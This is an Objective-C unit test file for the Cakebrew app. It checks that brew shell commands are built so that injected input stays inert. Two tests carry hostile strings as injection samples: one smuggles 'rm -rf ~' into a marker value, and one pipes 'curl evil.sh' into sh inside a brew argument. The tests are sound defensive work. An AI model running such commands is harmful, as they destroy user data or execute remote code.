//
//  BPHelperCommandTests.m
//  CakebrewTests
//
//  The helper builds its own shell invocation, so it must reproduce the
//  app's injection-safe argv shape exactly — including the output marker the
//  sync path uses to strip login-shell profile noise.
//

#import <XCTest/XCTest.h>
#import "BPHelperCommand.h"
#import "BPHomebrewInterface.h"

@interface BPHomebrewInterface (Testing)
- (NSArray *)formatArguments:(NSArray *)extraArguments sendOutputId:(BOOL)sendOutputID;
@end

@interface BPHelperCommandTests : XCTestCase
@end

@implementation BPHelperCommandTests

- (void)testWithoutMarkerMatchesTheAppsArgvShape
{
	NSArray *argv = [BPHelperCommand shellArgumentsForBrewArguments:@[ @"list" ] outputMarker:nil];
	XCTAssertEqualObjects(argv, (@[ @"-l", @"-c", @"brew \"$@\"", @"brew", @"list" ]));
}

- (void)testWithoutMarkerIsIdenticalToTheAppsOwnBuilder
{
	// Two places construct a brew shell invocation; pin them together so the
	// injection-safe shape can't drift in only one of them.
	NSArray *mine = [BPHelperCommand shellArgumentsForBrewArguments:@[ @"tap", @"user/repo" ] outputMarker:nil];
	NSArray *theirs = [[BPHomebrewInterface sharedInterface] formatArguments:@[ @"tap", @"user/repo" ] sendOutputId:NO];
	XCTAssertEqualObjects(mine, theirs);
}

- (void)testEmptyMarkerIsTreatedAsNoMarker
{
	NSArray *argv = [BPHelperCommand shellArgumentsForBrewArguments:@[ @"list" ] outputMarker:@""];
	XCTAssertEqualObjects(argv[2], @"brew \"$@\"");
}

- (void)testMarkerIsPassedAsAPositionalParameterNotInterpolated
{
	NSArray *argv = [BPHelperCommand shellArgumentsForBrewArguments:@[ @"list" ] outputMarker:@"+++MARK+++"];

	XCTAssertFalse([argv[2] containsString:@"+++MARK+++"],
				   @"the marker must not be interpolated into the command string: %@", argv[2]);
	XCTAssertTrue([argv containsObject:@"+++MARK+++"], @"it travels as an argument instead");
	XCTAssertEqualObjects(argv.lastObject, @"list", @"brew's own arguments still come last");
}

- (void)testMarkerWithShellMetacharactersStaysInert
{
	NSString *evil = @"\"; rm -rf ~; echo \"";
	NSArray *argv = [BPHelperCommand shellArgumentsForBrewArguments:@[ @"list" ] outputMarker:evil];

	XCTAssertFalse([argv[2] containsString:@"rm -rf"], @"command string stays fixed: %@", argv[2]);
	XCTAssertTrue([argv containsObject:evil], @"the payload survives as one inert argument");
}

- (void)testBrewArgumentsWithMetacharactersStayInert
{
	NSString *evil = @"foo; curl evil.sh | sh";
	NSArray *argv = [BPHelperCommand shellArgumentsForBrewArguments:@[ @"tap", evil ] outputMarker:@"M"];

	XCTAssertFalse([argv[2] containsString:@"curl"], @"%@", argv[2]);
	XCTAssertTrue([argv containsObject:evil]);
}

@end
